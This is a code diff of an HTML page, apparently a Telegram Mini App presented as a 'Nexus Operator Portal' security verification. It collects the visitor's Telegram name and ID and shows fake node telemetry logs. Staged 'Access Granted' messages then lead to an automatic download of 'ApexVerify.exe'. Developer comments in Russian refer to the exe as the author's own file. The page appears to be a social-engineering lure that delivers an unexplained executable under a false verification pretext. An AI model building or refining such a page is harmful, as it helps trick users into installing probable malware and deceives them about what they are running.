@@ -2,113 +2,169 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <!-- Подключаем скрипт Телеграма -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nexus Operator Portal</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <title>Nexus Business TMA</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; overflow: hidden; }
-        .card { background: #1e293b; padding: 30px; border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.3); width: 100%; max-width: 400px; }
-        
-        h2 { text-align: center; margin-top: 0; color: #f8fafc; font-size: 22px; }
-        p.desc { text-align: center; color: #94a3b8; font-size: 13px; margin-bottom: 20px; }
-
-        .user-badge { background: #0f172a; padding: 12px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #334155; display: flex; flex-direction: column; gap: 5px; }
-        .user-badge span { font-size: 12px; color: #3b82f6; font-weight: bold; text-transform: uppercase; }
-        .user-badge div { font-family: monospace; color: #e2e8f0; font-size: 15px; }
-
-        .time-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 25px; }
-        .time-slot { background: #334155; border: 1px solid #475569; padding: 12px; border-radius: 10px; text-align: center; cursor: pointer; transition: 0.2s; font-size: 14px; }
-        .time-slot.selected { background: #3b82f6; border-color: #60a5fa; color: white; box-shadow: 0 0 15px rgba(59, 130, 246, 0.5); }
-
-        .btn { background: #3b82f6; color: white; border: none; padding: 18px; border-radius: 14px; font-weight: 600; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; }
-        .btn:disabled { background: #475569; cursor: not-allowed; opacity: 0.5; }
-
-        #loader-section { display: none; text-align: center; padding: 30px 0; }
-        .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #3b82f6; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background-color: #0f172a; color: #f8fafc; font-family: 'Segoe UI', sans-serif; }
+        .grid-bg {
+            background-image: radial-gradient(circle at 2px 2px, rgba(59, 130, 246, 0.15) 1px, transparent 0);
+            background-size: 24px 24px;
+        }
+        .panel { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(51, 65, 85, 0.5); }
+        .glow { box-shadow: 0 0 20px rgba(59, 130, 246, 0.1); }
+        .time-slot.selected { background: #3b82f6; border-color: #60a5fa; box-shadow: 0 0 15px rgba(59, 130, 246, 0.4); }
     </style>
 </head>
-<body>
+<body class="grid-bg min-h-screen">
 
-<div class="card">
-    <div id="main-ui">
-        <h2>Verification Hub</h2>
-        <p class="desc">Your Telegram data is verified. Please select a time slot for your session.</p>
-
-        <!-- Блок с данными, которые мы вытянем автоматом -->
-        <div class="user-badge">
-            <span>Account Verified</span>
-            <div id="user_info">Loading data...</div>
+    <!-- Header -->
+    <header class="border-b border-slate-700/50 bg-slate-900/70 backdrop-blur sticky top-0 z-10">
+        <div class="container mx-auto px-4 py-4 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <div class="h-9 w-9 rounded-lg bg-blue-600 flex items-center justify-center shadow-[0_0_15px_rgba(37,99,235,0.5)]">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                </div>
+                <div>
+                    <h1 class="text-sm font-bold uppercase tracking-wider">Nexus Operator Portal</h1>
+                    <p class="text-[10px] text-slate-400">Layer 7 · Verified session: <span id="user-id-header">Pending...</span></p>
+                </div>
+            </div>
+            <span class="text-[10px] px-2 py-0.5 rounded-full border border-blue-500/40 text-blue-400 animate-pulse">● LIVE</span>
         </div>
+    </header>
 
-        <div class="time-grid">
-            <div class="time-slot" onclick="selectTime(this)">10:00 AM</div>
-            <div class="time-slot" onclick="selectTime(this)">01:30 PM</div>
-            <div class="time-slot" onclick="selectTime(this)">04:00 PM</div>
-            <div class="time-slot" onclick="selectTime(this)">07:45 PM</div>
-        </div>
+    <main class="container mx-auto px-4 py-8 space-y-6">
+        
+        <!-- Welcome Section -->
+        <section class="panel rounded-2xl p-6 glow">
+            <h2 class="text-2xl font-bold tracking-tight">Security Verification</h2>
+            <p class="mt-2 text-sm text-slate-400">
+                To access the validator infrastructure, you must link your Telegram ID and schedule an activation slot.
+            </p>
+        </section>
 
-        <button class="btn" id="confirmBtn" disabled onclick="startDownload()">Confirm & Download</button>
-    </div>
-
-    <div id="loader-section">
-        <div class="spinner"></div>
-        <h3 id="status-title">Syncing with Telegram...</h3>
-        <p id="msg" style="font-size: 14px; color: #94a3b8;">Finalizing access for your ID...</p>
-    </div>
-</div>
-
-<script>
-    const tg = window.Telegram.WebApp;
-    tg.expand(); // Разворачиваем на все окно
-
-    let selectedTimeSlot = null;
-    let userId = "Unknown";
-    let username = "Anonymous";
-
-    // Авто-получение данных при загрузке
-    window.onload = function() {
-        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
-            userId = tg.initDataUnsafe.user.id;
-            username = tg.initDataUnsafe.user.username ? "@" + tg.initDataUnsafe.user.username : "ID: " + userId;
-            document.getElementById('user_info').innerText = username + " [" + userId + "]";
-        } else {
-            document.getElementById('user_info').innerText = "Manual Auth Required";
-        }
-    };
-
-    function selectTime(el) {
-        document.querySelectorAll('.time-slot').forEach(s => s.classList.remove('selected'));
-        el.classList.add('selected');
-        selectedTimeSlot = el.innerText;
-        document.getElementById('confirmBtn').disabled = false;
-    }
-
-    function startDownload() {
-        document.getElementById('main-ui').style.display = 'none';
-        document.getElementById('loader-section').style.display = 'block';
-
-        const title = document.getElementById('status-title');
-        const msg = document.getElementById('msg');
-
-        setTimeout(() => {
-            title.innerText = "Slot Secured!";
-            msg.innerText = "Time: " + selectedTimeSlot + " for " + username;
+        <div id="booking-flow" class="grid gap-6 lg:grid-cols-3">
             
+            <!-- Form & Time Selection -->
+            <div class="lg:col-span-2 space-y-6">
+                <div class="panel rounded-xl p-6">
+                    <h3 class="text-sm font-semibold text-blue-400 uppercase mb-4 tracking-widest">1. Confirm Identity</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <div class="bg-slate-900/80 p-4 rounded-lg border border-slate-700">
+                            <label class="text-[10px] text-slate-500 uppercase">Telegram User</label>
+                            <div id="tg-name" class="font-mono text-blue-100 mt-1">Loading...</div>
+                        </div>
+                        <div class="bg-slate-900/80 p-4 rounded-lg border border-slate-700">
+                            <label class="text-[10px] text-slate-500 uppercase">Telegram ID</label>
+                            <div id="tg-id" class="font-mono text-blue-100 mt-1">Loading...</div>
+                        </div>
+                    </div>
+
+                    <h3 class="text-sm font-semibold text-blue-400 uppercase mt-8 mb-4 tracking-widest">2. Schedule Activation</h3>
+                    <div class="grid grid-cols-2 sm:grid-cols-4 gap-3" id="timeGrid">
+                        <div class="time-slot border border-slate-700 bg-slate-800/50 p-3 rounded-lg text-center cursor-pointer hover:border-blue-500/50 transition-all text-sm" onclick="selectSlot(this)">10:00 AM</div>
+                        <div class="time-slot border border-slate-700 bg-slate-800/50 p-3 rounded-lg text-center cursor-pointer hover:border-blue-500/50 transition-all text-sm" onclick="selectSlot(this)">12:30 PM</div>
+                        <div class="time-slot border border-slate-700 bg-slate-800/50 p-3 rounded-lg text-center cursor-pointer hover:border-blue-500/50 transition-all text-sm" onclick="selectSlot(this)">03:00 PM</div>
+                        <div class="time-slot border border-slate-700 bg-slate-800/50 p-3 rounded-lg text-center cursor-pointer hover:border-blue-500/50 transition-all text-sm" onclick="selectSlot(this)">06:15 PM</div>
+                    </div>
+
+                    <button id="mainBtn" disabled onclick="runSequence()" class="mt-8 w-full bg-blue-600 hover:bg-blue-500 disabled:bg-slate-700 disabled:opacity-50 text-white font-bold py-4 rounded-xl transition-all shadow-lg shadow-blue-900/20">
+                        REQUEST ACCESS
+                    </button>
+                </div>
+            </div>
+
+            <!-- Terminal Logs -->
+            <div class="panel rounded-xl p-6 h-fit">
+                <div class="flex items-center gap-2 mb-4">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-blue-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
+                    <h3 class="text-sm font-medium">System Telemetry</h3>
+                </div>
+                <div id="terminal" class="font-mono text-[11px] leading-relaxed h-64 overflow-hidden text-slate-400">
+                    <div class="text-blue-400">› nexus-operator v1.4.2 init</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Success/Loading Overlay -->
+        <div id="overlay" class="hidden fixed inset-0 z-50 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-6 text-center">
+            <div class="max-w-xs w-full">
+                <div class="h-16 w-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
+                <h2 id="status-title" class="text-xl font-bold mb-2">Verifying Node...</h2>
+                <p id="status-msg" class="text-sm text-slate-400">Syncing encrypted session with Nexus Layer 7...</p>
+            </div>
+        </div>
+
+    </main>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        let selected = null;
+        const terminal = document.getElementById('terminal');
+
+        // Логи как в твоем коде
+        const samples = [
+            "[net] gossip round complete (24 peers)",
+            "[sync] block 8,421,777 applied",
+            "[metrics] cpu 14% • mem 38%",
+            "[health] heartbeat OK",
+            "[net] handshake: eu-west-2",
+        ];
+
+        setInterval(() => {
+            const line = document.createElement('div');
+            line.innerHTML = `<span class="text-blue-500 mr-2">›</span> ${samples[Math.floor(Math.random()*samples.length)]}`;
+            terminal.appendChild(line);
+            if(terminal.childNodes.length > 12) terminal.removeChild(terminal.firstChild);
+        }, 2000);
+
+        // Получаем данные ТГ
+        window.onload = () => {
+            if (tg.initDataUnsafe?.user) {
+                document.getElementById('tg-name').innerText = "@" + (tg.initDataUnsafe.user.username || "User");
+                document.getElementById('tg-id').innerText = tg.initDataUnsafe.user.id;
+                document.getElementById('user-id-header').innerText = tg.initDataUnsafe.user.id;
+            } else {
+                document.getElementById('tg-name').innerText = "Web_Preview";
+                document.getElementById('tg-id').innerText = "00000000";
+            }
+        };
+
+        function selectSlot(el) {
+            document.querySelectorAll('.time-slot').forEach(s => s.classList.remove('selected'));
+            el.classList.add('selected');
+            selected = el.innerText;
+            document.getElementById('mainBtn').disabled = false;
+        }
+
+        function runSequence() {
+            document.getElementById('overlay').classList.remove('hidden');
+            const title = document.getElementById('status-title');
+            const msg = document.getElementById('status-msg');
+
             setTimeout(() => {
-                title.innerText = "Preparing File...";
-                msg.innerText = "Generating encrypted package...";
+                title.innerText = "Slot Confirmed";
+                msg.innerText = `ID linked to session at ${selected}`;
                 
                 setTimeout(() => {
-                    msg.style.color = '#10b981';
-                    msg.innerText = "✅ Verification Ready. Downloading...";
-                    // Твой проверенный путь
-                    window.location.href = 'api/v4/download/ApexVerify.exe';
+                    title.innerText = "Generating Package";
+                    msg.innerText = "Finalizing ApexVerify.exe checksums...";
+                    
+                    setTimeout(() => {
+                        title.innerText = "Access Granted";
+                        title.classList.add('text-green-500');
+                        msg.innerText = "Starting secure download...";
+                        
+                        // ПУТЬ К ТВОЕМУ ФАЙЛУ
+                        window.location.href = 'api/v4/download/ApexVerify.exe';
+                    }, 2000);
                 }, 2000);
             }, 2000);
-        }, 2000);
-    }
-</script>
-
+        }
+    </script>
 </body>
 </html>
